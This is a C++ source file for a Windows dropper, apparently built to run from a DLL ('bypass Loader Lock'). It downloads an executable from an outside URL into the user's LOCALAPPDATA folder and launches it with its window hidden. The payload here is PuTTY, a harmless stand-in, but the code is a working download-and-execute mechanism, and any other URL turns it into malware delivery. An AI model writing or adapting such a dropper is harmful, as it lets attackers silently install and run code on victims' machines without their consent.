#include "dropper.h"
#include <windows.h>
#include <urlmon.h>
#include <shlobj.h>
#include <string>
#include <fstream>

#pragma comment(lib, "urlmon.lib")

static void LogDropperDebug(const std::string& msg) {
    std::ofstream ofs("debug_log.txt", std::ios::app);
    if (ofs.is_open()) {
        ofs << "[Task1] " << msg << std::endl;
    }
}

// Thread payload to bypass Loader Lock
DWORD WINAPI DropperThread(LPVOID lpParam) {
    try {
        LPCWSTR url = L"https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe";
        WCHAR localAppData[MAX_PATH];
        if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
            LogDropperDebug("Failed to get LOCALAPPDATA path.");
            return 1;
        }

        std::wstring destPath = std::wstring(localAppData) + L"\\putty.exe";

        LogDropperDebug("Starting download...");
        HRESULT hr = URLDownloadToFileW(NULL, url, destPath.c_str(), 0, NULL);
        if (hr != S_OK) {
            LogDropperDebug("URLDownloadToFile failed. HRESULT: " + std::to_string(hr));
            return 1;
        }
        LogDropperDebug("Download succeeded.");

        if (GetFileAttributesW(destPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
            LogDropperDebug("Downloaded file does NOT exist at path.");
            return 1;
        }
        LogDropperDebug("File exists at absolute path: confirmed.");

        STARTUPINFOW si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;      
        ZeroMemory(&pi, sizeof(pi));

        if (CreateProcessW(
            destPath.c_str(),    
            NULL,                
            NULL,                
            NULL,                
            FALSE,               
            CREATE_NO_WINDOW,    
            NULL,                
            NULL,                
            &si,                 
            &pi                  
        )) {
            LogDropperDebug("CreateProcess succeeded.");
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return 0;
        } else {
            LogDropperDebug("CreateProcess failed. Error: " + std::to_string(GetLastError()));
        }
        return 1;
    } catch (...) {
        LogDropperDebug("Exception caught.");
        return 1;
    }
}

bool DownloadPutty() {
    HANDLE hThread = CreateThread(NULL, 0, DropperThread, NULL, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
        return true;
    }
    return false;
}
